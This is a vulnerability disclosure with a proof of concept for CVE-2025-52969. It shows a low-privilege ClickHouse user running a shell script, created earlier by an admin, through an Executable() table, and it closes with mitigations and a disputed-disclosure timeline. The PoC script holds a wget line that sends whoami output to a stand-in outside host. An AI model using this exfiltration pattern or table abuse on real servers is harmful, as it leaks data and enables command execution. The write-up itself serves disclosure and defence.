## ClickHouse Executable Table Abuse by Low Privilege User

#### CVE ID: [CVE-2025-52969](https://nvd.nist.gov/vuln/detail/CVE-2025-52969)
#### Date: 2025-06-19  
#### Author: Seth Kraft  
#### Vendor Homepage: https://clickhouse.com/  
#### Vendor Changelog: https://github.com/ClickHouse/ClickHouse/blob/master/CHANGELOG.md  
#### Software Link: https://github.com/ClickHouse/ClickHouse  
#### Version: 25.7.1.557 (official build)  
#### Tested On: ClickHouse 25.7.1 (default configuration, Ubuntu 24.04)
#### CWE: CWE-250 (Execution with Unnecessary Privileges)  
#### CVSS Base Score: 2.8 (Low)
#### Vector String: `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:L/A:N` 
#### Type: Authenticated OS Command Execution via Executable Table
---

## Authorization
**For research and authorized testing only.** Please do not use against systems without permission.

The issue was reviewed by the ClickHouse team and explicitly approved public disclosure of this write-up.

---

## Summary

ClickHouse allows table definitions using the `Executable()` engine, which runs system-level commands on `SELECT`. 

A low-privileged user with only `SELECT` rights can trigger these commands if an `Executable()` table is pre-created by a higher-privileged user. 

This enables authenticated OS command execution resulting in a privilege escalation vector.

---
## Details

ClickHouse’s `Executable` table engine allows tables to be backed by the output of shell scripts. 

```sql
CREATE TABLE rce_test (
    output String
) ENGINE = Executable('/var/lib/clickhouse/user_scripts/leak.sh', 'TSV');
```

Each `SELECT` query against this table executes the referenced script on the server.

---

## Proof of Concept

#### 1. **Prepare Bash Script For Abuse**

As a privileged user, create a bash script in `/var/lib/clickhouse/user_scripts/` that will later be abused by a low privileged user.

##### Script Name: `leak.sh`
```bash
#!/bin/bash
wget -q http://example.com?data=$(whoami)
```
> Note: This script will leak the `whoami` result to an external host when executed.

---

#### 2. **Create Executable Table**

Create the following table in the database as a privileged user.  This table will later be abused by the low privileged user.

```sql
CREATE TABLE rce_test (
    output String
) ENGINE = Executable('/var/lib/clickhouse/user_scripts/leak.sh', 'TSV');
```

---

#### 3. **Create Low-Privileged User**

```sql
CREATE USER lowpriv IDENTIFIED BY 'p@ssw0rd';
GRANT SELECT ON *.* TO lowpriv;
```

#### 4. Verify Low Privilege User Permissions:

```sql
SHOW GRANTS FOR lowpriv;
```

Expected output:

```text
GRANT SELECT ON *.* TO lowpriv
```
![image](https://github.com/user-attachments/assets/a69ea771-8f46-4723-aad3-b0e9f5888ae7)

---

#### 4. **Trigger Execution as Low-Privileged User**

```bash
curl 'http://localhost:8123/?user=lowpriv&password=p%40ssw0rd&query=SELECT+*+FROM+rce_test;'
```
> Note: URL encoding was used due to a special character in the password field

The external host will receive a request — proving that `lowpriv` was able to trigger OS-level execution via `SELECT` query.
![Screenshot 2025-06-18 234909](https://github.com/user-attachments/assets/b65fc5a5-3bca-40a6-8a41-9c93d2458e8f)

---

### Impact

* **Vulnerability Type:** Execution with Unnecessary Privileges (CWE-250).
* **Who Is Affected:** Environments that use `Executable()` tables and allow `SELECT` access broadly (including BI/reporting users).
* **Impact:** Authenticated users with no command execution or write access can still leverage pre-created command definitions.

---

### Mitigation / Recommendation

* **Restrict access** to any `Executable()` tables via granular `GRANT` controls — avoid granting `SELECT` on these objects to untrusted users.
* **Avoid creating `Executable()` tables** that point to sensitive or impactful scripts unless absolutely necessary.
* **Monitor and audit** access to the `user_scripts` directory and `Executable()` table usage.
* Consider adding a **configuration flag or privilege check** in ClickHouse to restrict execution of `Executable()` tables to specific roles.

Until stricter controls are implemented upstream, the burden of protection falls on administrative hygiene and access control discipline.

---

## Disclosure Timeline

* **2025-06-19:** Researcher reported to ClickHouse via Github Security Report
* **2025-06-19:** ClickHouse dismissed the issue as intended behavior and confirmed that public disclosure was permitted
* **2025-06-19:** Researcher responded with technical rebuttal, but vendor reiterated dismissal
* **2025-06-19:** Researcher initiated public disclosure and requested CVE assignment
* **2025-06-23:** MITRE assigned [CVE-2025-52969](https://nvd.nist.gov/vuln/detail/CVE-2025-52969) with disputed tag
* **2025-06-23:** Researcher notified Clickhouse of `CVE-2025-52969` assignment
* **2025-06-23:** ClickHouse clarified that a feature flag ticket was created to address this risk and improve application security
